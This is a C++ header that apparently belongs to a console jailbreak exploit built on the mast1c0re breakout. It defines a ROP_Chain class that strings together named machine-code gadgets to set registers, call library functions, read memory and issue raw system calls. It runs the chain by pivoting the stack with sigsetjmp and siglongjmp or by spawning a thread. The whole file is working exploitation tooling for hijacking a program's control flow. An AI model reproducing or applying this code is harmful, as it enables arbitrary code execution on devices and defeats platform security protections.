#pragma once

#include <mast1c0re.hpp>
#include "helpers.cpp"

typedef struct {
    uint64_t rip;           // [0x00] Return address (saved RIP)
    uint64_t rbx;           // [0x08]
    uint64_t rsp;           // [0x10]
    uint64_t rbp;           // [0x18]
    uint64_t r12;           // [0x20]
    uint64_t r13;           // [0x28]
    uint64_t r14;           // [0x30]
    uint64_t r15;           // [0x38]
    uint32_t fpu_control;   // [0x40] FPU control word
    uint32_t mxcsr;         // [0x44] MXCSR control word
    uint64_t sigmask[2];    // [0x48] Signal mask (16 bytes)
    uint32_t savesigs;      // [0x58] Whether signal mask was saved
    uint8_t _pad[4];        // Padding to align to 8 bytes
} sigjmp_buf;

int32_t sigsetjmp(sigjmp_buf *env, int32_t savesigs)
{
    int32_t ret = PS::Breakout::call(
        LIBKERNEL(LIB_KERNEL_SIGSETJMP),
        (uint64_t)PVAR_TO_NATIVE(env),
        (uint64_t)savesigs
    );
    if (ret != 0) printf_debug("sigsetjmp returned: %d errno: %p\n", ret, read_errno());
    return ret;
}

class ROP_Chain
{
    private:
        bool _is_initialized = false;
        uint64_t* chain = nullptr; // Pointer to the ROP chain buffer
        uint32_t chain_size = 0; // Size of the ROP chain buffer
        sigjmp_buf env = {0}; // setjmp/longjmp context

    public:
        uint32_t chain_index = 0; // Points to the next empty slot in the ROP chain

        // Initialize the ROP chain.
        // `chain_buf` should be aligned to 16 bytes.
        ROP_Chain(uint64_t* chain_buf, uint32_t size)
        {
            if (!chain_buf || !size) {
                printf_debug("ROP_Chain: Invalid `chain_buf` or `size`!\n");
                return;
            }
            chain = chain_buf;
            chain_size = size;
            push_padding(1); // Required for setjmp
            _is_initialized = true;
        }
    
        bool is_initialized() const
        {
            return _is_initialized;
        }

        void reset()
        {
            chain_index = 0;
            push_padding(1);
        }
    
        int32_t execute(ScePthread *thread = nullptr)
        {
            if (!_is_initialized) {
                printf_debug("ROP chain is not initialized!\n");
                return -1;
            }

            // Get the setjmp context
            if (sigsetjmp(&env, 0) != 0) return -1;

            if (!thread)
            {
                // Restore context at the end of the chain
                set_RSP(env.rsp);
                push_padding(1);
                push(env.rip);
            }

            // Prepare the longjmp context
            env.rip = GADGET(RET);
            env.rbx = 0;
            env.rsp = PVAR_TO_NATIVE(chain);
            env.rbp = 0;
            env.r12 = 0;
            env.r13 = 0;
            env.r14 = 0;
            env.r15 = 0;

            if (!thread)
            {
                PS::Breakout::call(
                    LIBKERNEL(LIB_KERNEL_SIGLONGJMP), PVAR_TO_NATIVE(&env)
                );
                return 0;
            }

            // Init pthread attribute
            ScePthreadAttr attr = 0;
            if (scePthreadAttrInit(&attr) != 0) return -1;
            if (scePthreadAttrSetstack(&attr, chain, chain_size) != 0)
            {
                if (chain_size < 0x4000)
                    printf_debug("Chain size should be at least 0x4000 bytes!\n");
                scePthreadAttrDestroy(&attr);
                return -1;
            }

            // Exit thread once done
            push_call(LIBKERNEL(LIB_KERNEL_PTHREAD_EXIT), 0);

            // Spawn thread to execute the ROP chain
            int32_t ret = scePthreadCreate(
                thread,
                &attr,
                LIBKERNEL(LIB_KERNEL_SIGLONGJMP),
                (void *)&env,
                0
            );

            scePthreadAttrDestroy(&attr); // Clean-up
            return ret != 0 ? -1 : 0;
        }

        void log_chain()
        {
            for (uint32_t i = 0; i < chain_index; i++)
                printf_debug("chain[%u]: %p\n", i, read_chain(i));
        }

        uint64_t read_chain(uint32_t index) const
        {
            return chain[index];
        }

        void push(uint64_t value)
        {
            chain[chain_index++] = value;
        }

        // Pushes `ret ;` as padding
        void push_padding(uint32_t size)
        {
            for (uint32_t i = 0; i < size; ++i)
                push(GADGET(RET));
        }
        
        void get_RAX(uint64_t* value)
        {
            set_RSI(PVAR_TO_NATIVE(value)); // RSI = &value
            push(GADGET(MOV_QWORD_OB_RSI_CB_RAX_RET)); // value = RAX
        }

        // get_RAX alias
        void get_result(int64_t* value)
        {
            get_RAX((uint64_t*)value);
        }

        void set_RAX(uint64_t rax)
        {
            push(GADGET(POP_RAX_RET));
            push(rax);
        }

        void set_RBX(uint64_t rbx)
        {
            push(GADGET(POP_RBX_RET));
            push(rbx);
        }

        void set_RSP(uint64_t rsp)
        {
            push(GADGET(POP_RSP_RET));
            push(rsp);
        }

        void set_RCX(uint64_t rcx)
        {
            push(GADGET(POP_RCX_RET));
            push(rcx);
        }

        // Changes RAX, RBX, RDX
        void set_RDX(uint64_t rdx)
        {
            set_RAX(rdx);
            set_RBX(GADGET(POP_RBX_RET)); // Pop call return into RBX
            push(GADGET(MOV_RDX_RAX_CALL_RBX));
        }

        void set_RDI(uint64_t rdi)
        {
            push(GADGET(POP_RDI_RET));
            push(rdi);
        }

        void set_RSI(uint64_t rsi)
        {
            push(GADGET(POP_RSI_RET));
            push(rsi);
        }

        private:
        uint64_t gadset_pop_rax_ret = GADGET(POP_RAX_RET);
        public:
        // Changes RAX, RBX, R8
        void set_R8(uint64_t r8)
        {
            set_RBX(r8);
            uint64_t gadset_off = VAR_TO_NATIVE(gadset_pop_rax_ret) - (uint64_t)0x78;
            set_RAX(gadset_off); // Pop call return into RAX
            push(GADGET(MOV_R8_RBX_CALL_QWORD_OB_RAX_PLUS_0X78_CB));
        }

        private:
        uint64_t gadset_pop_rbx_ret = GADGET(POP_RBX_RET);
        public:
        // Changes RAX, RBX, R13
        void set_R13(uint64_t r13)
        {
            set_RAX(r13);
            uint64_t gadset_off = VAR_TO_NATIVE(gadset_pop_rbx_ret) - (uint64_t)0x08;
            set_RBX(gadset_off); // Pop call return into RBX
            push(GADGET(MOV_R13_RAX_CALL_QWORD_OB_RBX_PLUS_0X08_CB));
        }

        private:
        uint64_t gadset_ret = GADGET(RET);
        char temp_var[256];
        public:
        // Changes RAX, RBX, RDI, R8, R9, R13
        void set_R9(uint64_t r9)
        {
            // Set r9d to zero (r9d & 0)
            set_R13(0);
            
            uint64_t gadset_off = VAR_TO_NATIVE(gadset_ret) + (uint64_t)0x260032D7;
            set_RBX(gadset_off);
            push(GADGET(AND_R9D_R13D_JMP_QWORD_OB_RBX_0X260032D7_CB));

            // or r9, rax
            set_R8(VAR_TO_NATIVE(temp_var));
            set_RAX(r9);
            set_RDI(0);
            push(GADGET(OR_R9_RAX_MOVZX_EAX_DIL_SHL_RAX_0X04_MOV_QWORD_OB_R8_PLUS_RAX_CB_RCX_MOV_QWORD_OB_R8_PLUS_RAX_PLUS_0X08_CB_R9_RET));
        }

        void read_memory_U64(uint64_t address, uint64_t* value)
        {
            set_RSI(address); // RSI = address
            push(GADGET(MOV_RAX_QWORD_OB_RSI_CB_RET)); // RAX = *RSI = *address
            get_RAX(value);
        }

        void push_call(uint64_t address)
        {
            push(address);
        }

        void push_call(uint64_t address, uint64_t rdi)
        {
            set_RDI(rdi);
            push(address);
        }

        void push_call(uint64_t address, uint64_t rdi, uint64_t rsi)
        {
            set_RDI(rdi);
            set_RSI(rsi);
            push(address);
        }

        void push_call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx)
        {
            set_RDX(rdx);
            set_RDI(rdi);
            set_RSI(rsi);
            push(address);
        }

        void push_call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx)
        {
            set_RDX(rdx);
            set_RDI(rdi);
            set_RSI(rsi);
            set_RCX(rcx);
            push(address);
        }

        void push_call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8)
        {
            set_R8(r8);
            set_RDX(rdx);
            set_RDI(rdi);
            set_RSI(rsi);
            set_RCX(rcx);
            push(address);
        }

        void push_call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8, uint64_t r9)
        {
            set_R9(r9);
            set_R8(r8);
            set_RDX(rdx);
            set_RDI(rdi);
            set_RSI(rsi);
            set_RCX(rcx);
            push(address);
        }

        void push_call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8, uint64_t r9, uint64_t stack1)
        {
            set_R9(r9);
            set_R8(r8);
            set_RDX(rdx);
            set_RDI(rdi);
            set_RSI(rsi);
            set_RCX(rcx);

            // Call gadget/function
            push(address);

            // Pop the following argument off the stack
            push(GADGET(POP_RCX_RET));
            push(stack1);
        }

        void push_call(uint64_t address, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8, uint64_t r9, uint64_t stack1, uint64_t stack2)
        {
            set_R9(r9);
            set_R8(r8);
            set_RDX(rdx);
            set_RDI(rdi);
            set_RSI(rsi);
            set_RCX(rcx);

            // Call gadget/function
            push(address);

            // Pop the following arguments off the stack
            push(GADGET(POP_RCX_ROL_CH_0XF8_POP_RSI_RET));
            push(stack1);
            push(stack2);
        }

        void push_syscall(int32_t index)
        {
            uint64_t address = DEREF(EBOOT(EBOOT_ERROR_STUB_PTR)) - LIB_KERNEL_SYS_RET_ERROR;
            set_RAX((uint64_t)index);
            push(address);
        }

        void push_syscall(int32_t index, uint64_t rdi)
        {
            uint64_t address = DEREF(EBOOT(EBOOT_ERROR_STUB_PTR)) - LIB_KERNEL_SYS_RET_ERROR;
            set_RAX((uint64_t)index);
            set_RDI(rdi);
            push(address);
        }

        void push_syscall(int32_t index, uint64_t rdi, uint64_t rsi)
        {
            uint64_t address = DEREF(EBOOT(EBOOT_ERROR_STUB_PTR)) - LIB_KERNEL_SYS_RET_ERROR;
            set_RAX((uint64_t)index);
            set_RDI(rdi);
            set_RSI(rsi);
            push(address);
        }

        void push_syscall(int32_t index, uint64_t rdi, uint64_t rsi, uint64_t rdx)
        {
            uint64_t address = DEREF(EBOOT(EBOOT_ERROR_STUB_PTR)) - LIB_KERNEL_SYS_RET_ERROR;
            set_RDX(rdx);
            set_RAX((uint64_t)index);
            set_RDI(rdi);
            set_RSI(rsi);
            push(address);
        }

        void push_syscall(int32_t index, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx)
        {
            uint64_t address = DEREF(EBOOT(EBOOT_ERROR_STUB_PTR)) - LIB_KERNEL_SYS_RET_ERROR;
            set_RDX(rdx);
            set_RAX((uint64_t)index);
            set_RDI(rdi);
            set_RSI(rsi);
            set_RCX(rcx);
            push(address);
        }

        void push_syscall(int32_t index, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8)
        {
            uint64_t address = DEREF(EBOOT(EBOOT_ERROR_STUB_PTR)) - LIB_KERNEL_SYS_RET_ERROR;
            set_R8(r8);
            set_RDX(rdx);
            set_RAX((uint64_t)index);
            set_RDI(rdi);
            set_RSI(rsi);
            set_RCX(rcx);
            push(address);
        }

        void push_syscall(int32_t index, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t rcx, uint64_t r8, uint64_t r9)
        {
            uint64_t address = DEREF(EBOOT(EBOOT_ERROR_STUB_PTR)) - LIB_KERNEL_SYS_RET_ERROR;
            set_R9(r9);
            set_R8(r8);
            set_RDX(rdx);
            set_RAX((uint64_t)index);
            set_RDI(rdi);
            set_RSI(rsi);
            set_RCX(rcx);
            push(address);
        }
};
